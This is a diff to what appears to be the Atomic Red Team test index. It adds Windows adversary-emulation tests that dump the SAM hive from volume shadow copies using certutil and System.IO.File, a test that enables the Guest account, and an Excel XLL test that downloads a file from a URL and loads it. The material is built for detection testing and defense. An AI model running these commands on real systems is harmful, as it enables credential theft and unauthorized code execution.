@@ -5440,6 +5440,75 @@ credential-access:
           Invoke-PowerDump
         name: powershell
         elevation_required: true
+    - name: dump volume shadow copy hives with certutil
+      auto_generated_guid: eeb9751a-d598-42d3-b11c-c122d9c3f6c7
+      description: |
+        Dump hives from volume shadow copies with the certutil utility
+        This can be done with a non-admin user account
+      supported_platforms:
+      - windows
+      input_arguments:
+        dump_path:
+          description: Path where the hive will be dumped
+          type: Path
+          default: "$ENV:temp"
+        target_hive:
+          description: Hive you wish to dump
+          type: String
+          default: SAM
+        dumped_hive:
+          description: Name of the dumped hive
+          type: String
+          default: myhive
+      executor:
+        command: |
+          write-host ""
+          $shadowlist = get-wmiobject win32_shadowcopy
+          $volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}
+          $maxvolume = ($volumenumbers | Sort-Object -Descending)[0]
+          $shadowpath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $maxvolume + "\Windows\System32\config\#{target_hive}"
+          certutil -f -v -encodehex $shadowpath #{dump_path}\#{dumped_hive} 2
+        name: powershell
+        elevation_required: false
+        cleanup_command: |
+          write-host ""
+          $toremove = #{dump_path} + "\" + '#{dumped_hive}'
+          rm $toremove
+    - name: dump volume shadow copy hives with System.IO.File
+      auto_generated_guid: 9d77fed7-05f8-476e-a81b-8ff0472c64d0
+      description: 'Dump hives from volume shadow copies with System.IO.File
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dump_path:
+          description: Path where the hive will be dumped
+          type: Path
+          default: "$ENV:temp"
+        target_hive:
+          description: Hive you wish to dump
+          type: String
+          default: SAM
+        dumped_hive:
+          description: Name of the dumped hive
+          type: String
+          default: myhive
+      executor:
+        command: |
+          write-host ""
+          $shadowlist = get-wmiobject win32_shadowcopy
+          $volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}
+          $maxvolume = ($volumenumbers | Sort-Object -Descending)[0]
+          $shadowpath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $maxvolume + "\Windows\System32\config\#{target_hive}"
+          $mydump = #{dump_path} + '\' + '#{dumped_hive}'
+          [System.IO.File]::Copy($shadowpath , $mydump)
+        name: powershell
+        elevation_required: false
+        cleanup_command: |-
+          write-host ""
+          $toremove = #{dump_path} + "\" + '#{dumped_hive}'
+          rm $toremove
   T1555.002:
     technique:
       external_references:
@@ -11659,6 +11728,23 @@ privilege-escalation:
           if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
+        name: command_prompt
+        elevation_required: true
+    - name: Activate Guest Account
+      auto_generated_guid: aa6cb8c4-b582-4f8e-b677-37733914abda
+      description: 'The Adversaries can activate the default Guest user. The guest
+        account is inactivated by default
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'net user guest /active:yes
+
+'
+        cleanup_command: 'net user guest /active:no
+
+'
         name: command_prompt
         elevation_required: true
   T1078.002:
@@ -21884,6 +21970,23 @@ defense-evasion:
           if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
+        name: command_prompt
+        elevation_required: true
+    - name: Activate Guest Account
+      auto_generated_guid: aa6cb8c4-b582-4f8e-b677-37733914abda
+      description: 'The Adversaries can activate the default Guest user. The guest
+        account is inactivated by default
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'net user guest /active:yes
+
+'
+        cleanup_command: 'net user guest /active:no
+
+'
         name: command_prompt
         elevation_required: true
   T1578.003:
@@ -37573,7 +37676,31 @@ persistence:
       x_mitre_platforms:
       - Windows
       - Office 365
-    atomic_tests: []
+      identifier: T1137.006
+    atomic_tests:
+    - name: Code Executed Via Excel Add-in File (Xll)
+      auto_generated_guid: 441b1a0f-a771-428a-8af0-e99e4698cda3
+      description: "Downloads a XLL file and loads it using the excel add-ins library.\nThis
+        causes excel to display the message \"Hello World\"\nSource of XLL - https://github.com/edparcell/HelloWorldXll
+        \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        xll_url:
+          description: url of the file HelloWorldXll.xll
+          type: url
+          default: https://https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1137.006/bin/HelloWorldXll.xll?raw=true
+        local_file:
+          description: name of the xll file
+          type: path
+          default: "$env:tmp\\HelloWorldXll.xll"
+      executor:
+        name: powershell
+        elevation_required: true
+        command: 'powershell -c "iwr -URI ''#{xll_url}'' -o ''#{local_file}''; IEX
+          ((new-object -ComObject excel.application).RegisterXLL(''$env:tmp\HelloWorldXll.xll''))"
+
+'
   T1098.001:
     technique:
       external_references:
@@ -40344,6 +40471,23 @@ persistence:
           if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
+        name: command_prompt
+        elevation_required: true
+    - name: Activate Guest Account
+      auto_generated_guid: aa6cb8c4-b582-4f8e-b677-37733914abda
+      description: 'The Adversaries can activate the default Guest user. The guest
+        account is inactivated by default
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'net user guest /active:yes
+
+'
+        cleanup_command: 'net user guest /active:no
+
+'
         name: command_prompt
         elevation_required: true
   T1136.002:
@@ -68795,6 +68939,23 @@ initial-access:
           if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
+        name: command_prompt
+        elevation_required: true
+    - name: Activate Guest Account
+      auto_generated_guid: aa6cb8c4-b582-4f8e-b677-37733914abda
+      description: 'The Adversaries can activate the default Guest user. The guest
+        account is inactivated by default
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'net user guest /active:yes
+
+'
+        cleanup_command: 'net user guest /active:no
+
+'
         name: command_prompt
         elevation_required: true
   T1078.002:
